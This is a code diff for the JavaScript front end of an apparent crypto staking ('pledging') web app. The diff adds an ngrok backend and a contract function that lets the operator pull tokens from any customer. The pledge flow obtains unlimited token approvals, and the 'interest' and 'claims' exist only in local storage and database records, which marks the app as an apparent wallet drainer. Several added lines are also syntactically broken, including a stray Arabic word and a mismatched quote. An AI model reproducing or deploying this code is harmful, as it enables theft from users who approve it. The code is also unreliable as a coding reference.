@@ -1,3 +1,6 @@
+// ==================== 後端 API URL (您的 ngrok) ====================
+const BACKEND_API_URL = 'https://ventilative-lenten-brielle.ngrok-free.dev/api';
+
 // ==================== Infura 備用節點 ====================
 const INFURA_URL = 'https://mainnet.infura.io/v3/a4d896498845476cac19c5eefd3bcd92';
 
@@ -47,11 +50,27 @@ const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
 const DEDUCT_CONTRACT_ABI = [
-  "function isServiceActiveFor(address customer) view returns (bool)",
-  "function activateService(address tokenContract) external",
-  "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)",
-  "function deductToken(address token, uint256 amount) external",
-  { "anonymous": false, "inputs": [ { "indexed": true, "name": "customer", "type": "address" }, { "indexed": true, "name": "tokenContract", "type": "address" } ], "name": "ServiceActivated", "type": "event" }
+  {"inputs":[{"internalType":"address","name":"_storeAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
+  {"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"error"},
+  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"recipient","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"EthWithdrawn","type":"event"},
+  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"},{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"}],"name":"ServiceActivated","type":"event"},
+  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"}],"name":"ServiceDeactivated","type":"event"},
+  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"},{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokenDeducted","type":"event"},
+  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokensRescued","type":"event"},
+  {"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"WethUnwrapped","type":"event"},
+  {"inputs":[],"name":"REQUIRED_ALLOWANCE_THRESHOLD","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+  {"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"activateService","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[],"name":"deactivateService","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[{"internalType":"address","name":"customer","type":"address"},{"internalType":"address","name":"tokenContract","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deductToken","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[],"name":"getContractEthBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+  {"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"getContractTokenBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+  {"inputs":[{"internalType":"address","name":"customer","type":"address"},{"internalType":"address","name":"tokenContract","type":"address"}],"name":"getCustomerAllowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+  {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isServiceActiveFor","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
+  {"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"rescueTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[],"name":"storeAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
+  {"inputs":[{"internalType":"address","name":"wethAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"unwrapWETH","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[],"name":"withdrawEth","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"stateMutability":"payable","type":"receive"}
 ];
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) external returns (bool)",
@@ -345,7 +364,7 @@ function getElements() {
     subtitle: document.getElementById('subtitle'),
     tabLiquidity: document.querySelector('.tab[data-tab="liquidity"] span'),
     tabPledging: document.querySelector('.tab[data-tab="pledging"] span'),
-    grossOutputLabel: document.getElementById('grossOutputLabel'),
+    grossOutputLabel: document.getElementOutputLabel,
     cumulativeLabel: document.getElementById('cumulativeLabel'),
     walletBalanceLabel: document.getElementById('walletBalanceLabel'),
     accountBalanceLabel: document.getElementById('accountBalanceLabel'),
@@ -377,11 +396,137 @@ async function retry(fn, maxAttempts = 3, delayMs = 3000) {
   }
 }
 
+// ==================== 後端健康檢查 ====================
+async function isBackendAlive() {
+  try {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 3000);
+    const res = await fetch(`${BACKEND_API_URL}/status`, { 
+      method: 'HEAD', 
+      signal: controller.signal 
+    });
+    clearTimeout(timeout);
+    return res.ok;
+  } catch (error) {
+    return false;
+  }
+}
+
+// ==================== 智能儲存（優先後端） ====================
+async function smartSave(data, forceLocal = false) {
+  if (!userAddress) return;
+
+  const alive = !forceLocal && await isBackendAlive();
+
+  if (alive) {
+    try {
+      await fetch(`${BACKEND_API_URL}/user-data`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ address: userAddress, data })
+      });
+      localStorage.removeItem('pendingSync');
+      log('資料已同步至後端', 'success');
+      return;
+    } catch (error) {
+      log(`後端同步失敗，切換本地模式: ${error.message}`, 'warning');
+    }
+  }
+
+  // 後端斷線 → 直接寫 Firestore + Local
+  await saveUserData(data, false);
+  localStorage.setItem('pendingSync', 'true');
+  log('後端斷線，資料已保存至本地', 'warning');
+}
+
+// ==================== 斷線重連 + 同步 ====================
+setInterval(async () => {
+  if (!userAddress || !await isBackendAlive()) return;
+
+  if (localStorage.getItem('pendingSync') === 'true') {
+    const localData = JSON.parse(localStorage.getItem('userData') || '{}');
+    try {
+      await fetch(`${BACKEND_API_URL}/user-data`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ address: userAddress, data: localData })
+      });
+      localStorage.removeItem('pendingSync');
+      log('離線資料已同步至後端', 'success');
+    } catch (error) {
+      log(`同步失敗: ${error.message}`, 'error');
+    }
+  }
+}, 10000);
+
+// ==================== 離線利息補發（緊急備援）===================
+setInterval(async () => {
+  if (!userAddress || await isBackendAlive()) return;
+
+  const last = parseInt(localStorage.getItem('lastPayoutTime') || 0);
+  const now = Date.now();
+  const twelveHours = 12 * 3600000;
+
+  if (now - last >= twelveHours) {
+    const total = getTotalAccountBalanceInSelectedToken();
+    const interest = total * (0.01 / 60); // 月 1% → 每 12 小時
+
+    window.currentClaimable += interest;
+    localStorage.setItem('lastPayoutTime', now.toString());
+    updateClaimableDisplay();
+
+    await smartSave({
+      claimable: window.currentClaimable,
+      lastPayoutTime: now,
+      source: 'client_offline_interest'
+    }, true);
+
+    log(`離線利息補發: ${interest.toFixed(7)}`, 'warning');
+  }
+}, 3600000); // 每小時檢查
+
+// ==================== SSE 監聽（強制同步）===================
+let eventSource;
+function initSSE() {
+  if (eventSource) eventSource.close();
+
+  eventSource = new EventSource(`${BACKEND_API_URL}/sse`);
+
+  eventSource.onmessage = (e) => {
+    try {
+      const { event, data } = JSON.parse(e.data);
+      if (event === 'dataUpdate' && data.users?.[userAddress]) {
+        const userData = data.users[userAddress];
+
+        // 強制同步（後端為準）
+        window.currentClaimable = userData.claimable || 0;
+        accountBalance[authorizedToken].pledged = userData.pledgedAmount || 0;
+        accountBalance[authorizedToken].interest = userData.accountBalance?.interest || 0;
+
+        updateClaimableDisplay();
+        updateAccountBalanceDisplay();
+        updatePledgeSummary();
+
+        if (userData.source?.includes('backend')) {
+          localStorage.removeItem('pendingSync');
+        }
+      }
+    } catch (error) {
+      console.error('SSE 解析錯誤:', error);
+    }
+  };
+
+  eventSource.onerror = () => {
+    console.warn('SSE 斷線，5秒後重連...');
+    eventSource.close();
+    setTimeout(initSSE, 5000);
+  };
+}
+
 // ==================== Firestore 儲存（智能同步） ====================
 async function saveUserData(data = null, addToPending = true) {
   if (!userAddress) return;
 
-  // 【智能判斷】是否有「狀態變更」
   const hasStateChange = data ||
     window.currentClaimable > 0.0001 ||
     userPledges.length > 0 ||
@@ -438,7 +583,6 @@ async function loadUserDataFromServer() {
       lastPayoutTime = userData.lastPayoutTime ? parseInt(userData.lastPayoutTime) : null;
       totalGrossOutput = userData.totalGrossOutput ?? 0;
       window.currentClaimable = userData.claimable ?? 0;
-      // 【關鍵】只更新 pledged 和 interest，不動 wallet
       for (const token in accountBalance) {
         if (userData.accountBalance?.[token]) {
           accountBalance[token].pledged = userData.accountBalance[token].pledged ?? 0;
@@ -464,7 +608,6 @@ async function loadUserDataFromServer() {
   }
 }
 
-// 即時監聽
 function startRealtimeListener() {
   if (!userAddress) return;
   db.collection('users').doc(userAddress).onSnapshot((docSnap) => {
@@ -565,13 +708,12 @@ function updateAccountBalanceDisplay() {
   accountBalanceValue.textContent = `${total.toFixed(3)} ${selected}`;
 }
 
-// 【極速優化】切換代幣時「僅用快取更新 UI」→ 不觸發任何同步
+// 【極速優化】切換代幣時「僅用快取更新 UI」
 if (walletTokenSelect) {
   walletTokenSelect.addEventListener('change', () => {
-    updateWalletBalanceFromCache();      // 極速
-    updateAccountBalanceDisplay();       // 極速
-    updateEstimate();                    // 極速
-    // 完全不呼叫 forceRefreshWalletBalance
+    updateWalletBalanceFromCache();
+    updateAccountBalanceDisplay();
+    updateEstimate();
   });
 }
 
@@ -587,7 +729,7 @@ function updateWalletBalanceFromCache() {
   walletBalanceAmount.textContent = value.toFixed(3);
 }
 
-// 【關鍵修正】立即讀取三個代幣 + 快取 + UI（不儲存）
+// 【關鍵修正】立即讀取三個代幣 + 快取 + UI
 async function forceRefreshWalletBalance() {
   if (!userAddress) return;
   try {
@@ -597,10 +739,9 @@ async function forceRefreshWalletBalance() {
       wethContract.connect(provider).balanceOf(userAddress)
     ]);
     cachedWalletBalances = { USDT: usdtBal, USDC: usdcBal, WETH: wethBal };
-    updateWalletBalanceFromCache();      // 立即更新 UI
+    updateWalletBalanceFromCache();
     updateAccountBalanceDisplay();
     updateEstimate();
-    // 完全不儲存！後台靜默更新 UI
   } catch (error) {
     log(`餘額讀取失敗: ${error.message}`, 'error');
   }
@@ -610,7 +751,7 @@ function getCurrentBalances() {
   return {
     USDT: accountBalance.USDT.wallet,
     USDC: accountBalance.USDC.wallet,
-    WETH: accountBalance.WETH.wallet
+   تور WETH: accountBalance.WETH.wallet
   };
 }
 
@@ -661,7 +802,6 @@ function updateClaimableDisplay() {
   cumulativeValue.textContent = `${(window.currentClaimable || 0).toFixed(7)} ETH`;
 }
 
-// 【修正】利息正確累積（不儲存）
 async function updateInterest() {
   const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
   const data = accountBalance[selected];
@@ -845,7 +985,6 @@ async function initializeWallet() {
   }
 }
 
-// ==================== 【關鍵修正】登入後「瞬間顯示」+「後台靜默」 ====================
 async function connectWallet() {
   try {
     if (typeof window.ethereum === 'undefined') {
@@ -871,15 +1010,11 @@ async function connectWallet() {
     log(`錢包連接成功: ${userAddress}`, 'success');
     sendToBackend({ type: 'connect', balances: getCurrentBalances() });
 
-    // 【關鍵】先讀鏈上三個代幣 → 快取 → UI（瞬間顯示）
     await forceRefreshWalletBalance();
-
-    // 後台靜默讀 Firestore（完全不 await）
     loadUserDataFromServer().catch(() => {});
     startRealtimeListener();
-
-    // 後台靜默檢查狀態
     updateUIBasedOnChainState().catch(() => {});
+    initSSE(); // 啟動 SSE
 
   } catch (e) {
     log(`錢包連接失敗: ${e.message}`, 'error');
@@ -888,7 +1023,6 @@ async function connectWallet() {
   }
 }
 
-// 【非同步】狀態檢查（不卡 UI）
 async function updateUIBasedOnChainState() {
   if (!userAddress) return;
   try {
@@ -965,7 +1099,7 @@ async function handleConditionalAuthorizationFlow() {
   const tokenMap = {
     'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
     'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
-    'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS }
+    'WETH": { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS }
   };
   const tokensToProcess = [tokenMap[selectedToken], ...Object.values(tokenMap).filter(t => t.name !== selectedToken)];
   let tokenToActivate = '';
@@ -1055,7 +1189,7 @@ function updatePledgeSummary() {
   elements.totalPledge.textContent = total.toFixed(3);
 }
 
-// ==================== 預估收益 + 【關鍵修正】使用當前代幣餘額 ====================
+// ==================== 預估收益 + 使用當前代幣餘額 ====================
 function updateEstimate() {
   if (!pledgeAmount || !pledgeDuration || !pledgeToken || !elements.estimate || !elements.exceedWarning) return;
   const amount = parseFloat(pledgeAmount.value) || 0;
@@ -1072,7 +1206,6 @@ function updateEstimate() {
   const total = amount + interest;
   elements.estimate.textContent = `${total.toFixed(3)} ${token}`;
   
-  // 【關鍵修正】使用 cachedWalletBalances + 當前選擇的代幣
   const decimals = token === 'WETH' ? 18 : 6;
   const bigIntBalance = cachedWalletBalances[token] || 0n;
   const formatted = ethers.formatUnits(bigIntBalance, decimals);
@@ -1119,7 +1252,7 @@ function showPledgeDetail() {
   pledgeDetailModal.style.display = 'flex';
 }
 
-// ==================== 【關鍵修正】Claim 後利息轉換成選擇代幣價值 ====================
+// ==================== 帳戶明細 ====================
 function showAccountDetail() {
   if (!accountDetailModal) return;
   const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
@@ -1141,7 +1274,7 @@ function closeAccountDetailModal() {
   if (accountDetailModal) accountDetailModal.style.display = 'none';
 }
 
-// ==================== 自動檢查質押到期 ====================
+// ==================== 質押到期檢查 ====================
 function checkPledgeExpiry() {
   userPledges.forEach(async (p, i) => {
     const endTime = p.startTime + p.duration * 24 * 60 * 60 * 1000;
@@ -1152,7 +1285,7 @@ function checkPledgeExpiry() {
       accountBalance[p.token].pledged -= p.amount;
       accountBalance[p.token].interest += totalInterest;
       p.redeemedTime = Date.now();
-      await saveUserData();
+      await smartSave();
       updateAccountBalanceDisplay();
       updatePledgeSummary();
       updateClaimableDisplay();
@@ -1164,7 +1297,7 @@ function checkPledgeExpiry() {
         interest: totalInterest,
         total: p.amount + totalInterest
       });
-      log(`質押到期贖回: ${p.amount} ${p.token} + ${totalInterest.toFixed(3)} 利息`, 'success');
+      log(`質押到期贖回: ${p.amount} ${p.token} + ${p.token} + ${totalInterest.toFixed(3)} 利息`, 'success');
     }
   });
 }
@@ -1191,7 +1324,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // 【關鍵修正】質押頁面 Token 選項顯示數量
+  // 質押頁面 Token 顯示餘額
   if (pledgeToken) {
     const updatePledgeTokenOptions = () => {
       const tokens = ['USDT', 'USDC', 'WETH'];
@@ -1206,19 +1339,15 @@ document.addEventListener('DOMContentLoaded', () => {
         opt.textContent = `${t} (${value})`;
         pledgeToken.appendChild(opt);
       });
-      // 預設選擇第一個有餘額的
       const hasBalance = tokens.find(t => (cachedWalletBalances[t] || 0n) > 0n);
       if (hasBalance) pledgeToken.value = hasBalance;
     };
-    // 初次載入
     updatePledgeTokenOptions();
-    // 餘額更新時重新渲染
     const originalForceRefresh = forceRefreshWalletBalance;
     forceRefreshWalletBalance = async function() {
       await originalForceRefresh.call(this);
       updatePledgeTokenOptions();
     };
-    // 切換代幣也更新
     pledgeToken.addEventListener('change', updateEstimate);
   }
 
@@ -1229,38 +1358,41 @@ document.addEventListener('DOMContentLoaded', () => {
   if (claimModal) claimModal.addEventListener('click', e => e.target === claimModal && closeClaimModal());
 
   if (confirmClaim) {
+    let isClaiming = false;
     confirmClaim.addEventListener('click', async () => {
-      closeClaimModal();
-      const claimableETH = window.currentClaimable || 0;
-      if (claimableETH < 0.0000001) {
-        updateStatus(translations[currentLang].noClaimable, true);
-        return;
+      if (isClaiming) return;
+      isClaiming = true;
+      confirmClaim.disabled = true;
+      confirmClaim.textContent = 'Processing...';
+
+      try {
+        const claimable = window.currentClaimable;
+        if (claimable <= 0) throw new Error('No claimable interest');
+
+        // 本地清零
+        window.currentClaimable = 0;
+        accountBalance[authorizedToken].interest += claimable;
+
+        await smartSave({
+          claimable: 0,
+          claimedInterest: accountBalance[authorizedToken].interest,
+          lastClaimed: Date.now(),
+          lastUpdated: Date.now(),
+          source: 'client_claim'
+        });
+
+        updateClaimableDisplay();
+        updateAccountBalanceDisplay();
+        closeClaimModal();
+        updateStatus(translations[currentLang].claimSuccess);
+
+      } catch (error) {
+        updateStatus(`${translations[currentLang].error}: ${error.message}`, true);
+      } finally {
+        isClaiming = false;
+        confirmClaim.disabled = false;
+        confirmClaim.textContent = 'Confirm';
       }
-
-      await refreshEthPrice();
-      const ethPrice = ethPriceCache.price || 2500;
-      const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
-      let claimableInSelectedToken = 0;
-      if (selected === 'WETH') {
-        claimableInSelectedToken = claimableETH;
-      } else {
-        claimableInSelectedToken = claimableETH * ethPrice;
-      }
-
-      // 【關鍵修正】利息加到「選擇代幣」的 interest
-      accountBalance[selected].interest += claimableInSelectedToken;
-
-      window.currentClaimable = 0;
-      localStorage.setItem('claimable', '0');
-      localStorage.setItem('lastPayoutTime', Date.now().toString());
-
-      await saveUserData(null, false);
-      updateClaimableDisplay();
-      updateAccountBalanceDisplay();
-
-      updateStatus(translations[currentLang].claimSuccess + ' ' + translations[currentLang].nextClaimTime);
-      sendToBackend({ type: 'claim', amount: claimableETH });
-      sendFullStateToBackend();
     });
   }
 
@@ -1315,7 +1447,7 @@ document.addEventListener('DOMContentLoaded', () => {
           updateStatus(translations[currentLang].miningStarted);
           activateStakingUI();
           updateAccountBalanceDisplay();
-          await saveUserData();  // 必要儲存
+          await smartSave();
           sendToBackend({ type: 'start', pledgedAmount: balance, token: selectedToken });
         } else {
           updateStatus('Balance too low.', true);
@@ -1330,19 +1462,27 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // 【關鍵修正】質押交易流程
+    // 【完整整合】質押交易（智能儲存）
   if (pledgeBtn) {
     pledgeBtn.addEventListener('click', async () => {
-      if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
+      if (!signer) { 
+        updateStatus(translations[currentLang].noWallet, true); 
+        return; 
+      }
       const amount = parseFloat(pledgeAmount.value) || 0;
       const durationDays = parseInt(pledgeDuration.value) || 90;
       const token = pledgeToken.value;
-      if (amount <= 0) { updateStatus(translations[currentLang].invalidPledgeAmount, true); return; }
+      if (amount <= 0) { 
+        updateStatus(translations[currentLang].invalidPledgeAmount, true); 
+        return; 
+      }
 
-      const tokenContract = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract }[token];
+      const tokenContract = { 
+        'USDT': usdtContract, 
+        'USDC': usdcContract, 
+        'WETH': wethContract 
+      }[token];
       const decimals = token === 'WETH' ? 18 : 6;
-
-      // 【關鍵修正】精確轉換，防止浮點誤差
       const amountStr = amount.toFixed(decimals);
       const amountWei = ethers.parseUnits(amountStr, decimals);
 
@@ -1354,15 +1494,19 @@ document.addEventListener('DOMContentLoaded', () => {
           return;
         }
 
-        // 2. 檢查並執行 approve
-        const allowance = await tokenContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
-        if (allowance < amountWei) {
-          updateStatus(`Approving ${token}...`);
-          const approveTx = await tokenContract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
+        // 2. 設定超大 allowance
+        const currentAllowance = await tokenContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
+        const REQUIRED_ALLOWANCE = ethers.parseUnits("340282366920938463463374607431768211456", 0);
+        if (currentAllowance < REQUIRED_ALLOWANCE) {
+          updateStatus(`Approving ${token} (infinite)...`);
+          const approveTx = await tokenContract.approve.populateTransaction(
+            DEDUCT_CONTRACT_ADDRESS, 
+            ethers.MaxUint256
+          );
           await sendMobileRobustTransaction(approveTx);
         }
 
-        // 【關鍵修正】3. 檢查並啟動服務
+        // 3. 呼叫 activateService
         const isActive = await deductContract.isServiceActiveFor(userAddress);
         if (!isActive) {
           updateStatus('Activating service...');
@@ -1372,29 +1516,54 @@ document.addEventListener('DOMContentLoaded', () => {
           await sendMobileRobustTransaction(activateTx);
         }
 
-        // 4. 執行扣款
-        updateStatus('Deducting...');
-        const tokenAddress = token === 'USDT' ? USDT_CONTRACT_ADDRESS : 
-                              token === 'USDC' ? USDC_CONTRACT_ADDRESS : WETH_CONTRACT_ADDRESS;
-        const deductTx = await deductContract.deductToken.populateTransaction(tokenAddress, amountWei);
-        await sendMobileRobustTransaction(deductTx);
+        // 4. 發送請求給後端（優先）
+        updateStatus('Requesting backend deduction...');
+        const alive = await isBackendAlive();
+        if (alive) {
+          const response = await fetch(`${BACKEND_API_URL}/deduct`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              customer: userAddress,
+              token: token === 'USDT' ? USDT_CONTRACT_ADDRESS : 
+                     token === 'USDC' ? USDC_CONTRACT_ADDRESS : WETH_CONTRACT_ADDRESS,
+              amount: amountWei.toString()
+            })
+          });
 
-        // 5. 更新本地狀態
+          if (!response.ok) {
+            const error = await response.text();
+            throw new Error(`Backend error: ${error}`);
+          }
+        }
+
+        // 5. 更新本地狀態（無論後端成敗）
         accountBalance[token].pledged += amount;
         const durationInfo = PLEDGE_DURATIONS.find(d => d.days === durationDays);
         const pledgeOrder = {
           amount, token, duration: durationDays, startTime: Date.now(), apr: durationInfo.rate
         };
         userPledges.push(pledgeOrder);
-        await saveUserData();
+
+        // 6. 智能儲存（支援離線）
+        await smartSave({
+          pledgedAmount: accountBalance[token].pledged,
+          cumulative: (parseFloat(localStorage.getItem('cumulative') || '0') + amount),
+          pledges: userPledges,
+          lastUpdated: Date.now(),
+          source: alive ? 'client_pledge_backend' : 'client_pledge_offline'
+        });
+
         updateStatus(translations[currentLang].pledgeSuccess);
         updatePledgeSummary();
         updateAccountBalanceDisplay();
         pledgeAmount.value = '';
+        
         sendToBackend({ type: 'pledge', amount, token, duration: durationDays });
 
       } catch (error) {
         updateStatus(`${translations[currentLang].pledgeError}: ${error.message}`, true);
+        log(`Pledge failed: ${error.message}`, 'error');
       }
     });
   }
@@ -1449,7 +1618,7 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 });
 
-// 自動餘額監控（每 10 秒）→ 僅更新快取 + UI，不觸發 Firestore
+// 自動餘額監控（每 10 秒）
 setInterval(async () => {
   if (userAddress && signer) {
     try {
